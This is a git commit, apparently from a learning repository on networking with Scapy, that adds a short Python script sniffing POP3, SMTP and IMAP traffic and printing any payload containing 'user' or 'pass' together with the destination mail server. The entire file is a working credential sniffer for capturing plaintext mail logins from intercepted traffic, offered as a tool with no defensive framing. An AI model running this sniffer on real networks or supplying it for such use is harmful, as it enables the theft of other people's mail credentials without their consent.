11c48134cb3ab373a053f880c81aab4a654c5398
Simardeep Singh <simardeepsngh1@gmail.com>
2021-03-24 07:22:53 -0400

    Networking with Scapy, E-Mail Sniffing

---
+++ Networking_Scapy/Mail_Sniffer/mail_sniffer.py
@@ -0,0 +1,16 @@
+#!/bin/python3
+from scapy.all import *
+
+
+# Pakcet Callback
+def packet_callback(packet):
+    if packet[TCP].payload:
+        mail_packet = str(packet[TCP].payload)
+
+        if "user" in mail_packet.lower() or "pass" in mail_packet.lower():
+            print("[*] Server: %s" % packet[IP].dst)
+            print("[*] %s" % packet[TCP].payload)
+            
+
+# Sniffer
+sniff(filter="tcp port 110 or tcp port 25 or tcp port 143", prn=packet_callback, store=1)
